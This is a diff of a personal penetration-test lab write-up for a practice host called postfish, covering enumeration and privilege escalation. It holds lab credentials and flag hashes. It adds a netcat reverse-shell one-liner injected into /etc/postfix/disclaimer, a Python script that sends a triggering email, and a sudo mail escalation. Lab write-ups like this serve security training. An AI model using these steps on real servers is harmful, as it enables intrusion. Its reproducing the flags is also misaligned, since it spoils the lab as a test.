@@ -2,14 +2,14 @@
 
 - IP Address:  192.168.148.137
 - Hostname: postfish
-- OS: 	Ubuntu
+- OS: 	Ubuntu 20.04.1 LTS
 - Found Credentials/Users:
 brian.moore / EternalSunshinE
 
 Main Objectives:
 
 Local.txt = f461a14a387422410744cb2e322f7c30
-Proof.txt = 
+Proof.txt = a9d5de8c9bcf062cc8dd9f6df724b244
 
 **Enumeration**
 
@@ -967,8 +967,21 @@ brian.moore@postfish:~$ grep -i docker /proc/1/cgroup 2>/dev/null
 10. Automated Enumeration 
 
 ```
+uid=1000(brian.moore) gid=1000(brian.moore) groups=1000(brian.moore),8(mail),997(filter)
+
+uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
+
+Ubuntu 20.04.1 LTS
+
+1.8.31 
 
 Vulnerable to CVE-2021-3560
+
+[/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep](https://www.exploit-db.com/exploits/411)
+
+/home/brian.moore/.bash_history
+
+
 
 ```
 
@@ -976,15 +989,60 @@ Vulnerable to CVE-2021-3560
 
 ```
 https://www.exploit-db.com/exploits/34896
+https://www.exploit-db.com/exploits/6337
+https://www.exploit-db.com/exploits/411
+
+uid=1000(brian.moore) gid=1000(brian.moore) groups=1000(brian.moore),8(mail),997(filter)
 ```
 
 **Privilege Escalation**
 
 1. PE Steps
 
-```
+- After research found that there is a privilege escalation vulnerability if you have access to the /etc/postfix/disclaimer. Which access to the filter group brian.moore as the following permissions. 
+
+![[Pasted image 20260309125422.png]]
+
+- Added the following  to the /etc/postfix/disclaimer file.
 
 ```
+mkfifo /tmp/f; nc 192.168.45.215 443 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+```
+
+![[Pasted image 20260309125553.png]]
+
+- Since the disclaimer in assigned to it@postfish.off and brian.moore@postfish.off, I needed to send an email to brian or it. 
+
+![[Pasted image 20260309125724.png]]
+
+- Sent email using the below python script. 
+
+```
+#!/usr/bin/python3
+
+import smtplib
+
+sender = 'brian.moore@postfish.off'
+receivers = ['brian.moore@postfish.off']
+
+message = """From: From Brian <brian.moore@postfish.off>
+To: To Brian <brian.moore@postfish.off>
+Subject: Give me a reverse shell pls
+
+Why? Because I asked nicely.
+"""
+
+try:
+   smtpObj = smtplib.SMTP('localhost')
+   smtpObj.sendmail(sender, receivers, message)         
+except SMTPException:
+   print("Error: unable to send email")
+
+```
+
+- Received reverse shell when disclaimer was added to e-mail. Did a sudo -l and saw I could run mail as sudo with filter account. Found escalation opportunity in gtfobin https://gtfobins.org/gtfobins/mail/.
+
+![[Pasted image 20260309125909.png]]
 
 2. Notes
 
